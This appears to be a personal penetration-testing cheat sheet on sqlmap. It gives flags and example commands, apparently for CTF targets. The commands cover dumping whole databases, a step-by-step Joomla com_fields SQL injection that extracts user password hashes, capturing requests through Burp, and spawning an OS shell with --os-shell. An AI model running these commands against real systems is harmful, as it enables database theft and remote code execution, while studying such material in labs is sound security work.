## SQL map
```
git clone --depth 1 <https://github.com/sqlmapproject/sqlmap.git> sqlmap-dev
```
Command
--url
Provide URL for the attack

--dbms
Tell SQLMap the type of database that is running

--dump
Dump the data within the database that the application uses

--dump-all
Dump the ENTIRE database

--batch
SQLMap will run automatically and won't ask for user input

### Example commands
```
sqlmap --url http://tbfc.net/login.php --tables --columns

sqlmap -r newsanta  --tamper=space2comment --dump-all --dbms sqlite 

```

- Dump all DB
```
  sqlmap -r request.txt --dbms=mysql --dump
```

#### Example working through DB
```
Initial scan
sqlmap -u "http://$TGT/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]

Find tables in database joomla:
sqlmap -u "http://$TGT/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] --tables -D joomla

Find columns in table:	-T '#__users'
sqlmap -u "http://$TGT/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] --columns -D joomla -T '#__users'

+----------+-------------+
| Column   | Type        |
+----------+-------------+
| email    | non-numeric |
| id       | numeric     |
| name     | non-numeric |
| params   | numeric     |
| password | non-numeric |
| username | non-numeric |
+----------+-------------+

Finally dump the data:
sqlmap -u "http://$TGT/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -C password -D joomla -T "#__users" --dump
```

###  With Burpsuite
Send request to Burp then the repeater
RIght click and save item in repeater or proxy.

```
sqlmap -r filename
```

### Spawn shell
```
sqlmap -r reqFile --os-shell
```
Look to [[Reverse Shell#Shell Stabalisation|stabalise shell with python]] afterwards